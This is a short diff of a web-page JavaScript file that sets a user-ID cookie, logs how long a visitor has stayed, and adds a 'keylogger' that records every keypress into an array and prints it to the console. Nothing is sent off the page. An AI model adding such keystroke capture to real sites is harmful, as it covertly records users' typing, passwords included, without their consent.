@@ -11,8 +11,20 @@ if(typeof cookie == undefined ){
   document.cookie = "userid="+userid+"; expires="+expires+"; path=/; cookiename=cookiemonster";
 }
 
-console.log("My user ID is: "+ cookie);
 
+var myVar = setInterval(myTimer, 1000);
+var timespent = 0;
+function myTimer() {
+    timespent+=1000;
+    console.log("Youve been one this site for "+ timespent/1000 + " seconds");
+}
+
+console.log("My user ID is: "+ cookie);
+var keylogger = []
+document.onkeypress=function(e){
+console.log(keylogger);    //do the required work;
+keylogger.push(e.key);
+}
 //This function gets a cookie and sees returns the users session id
 function getCookie() {
     var id = "userid=";
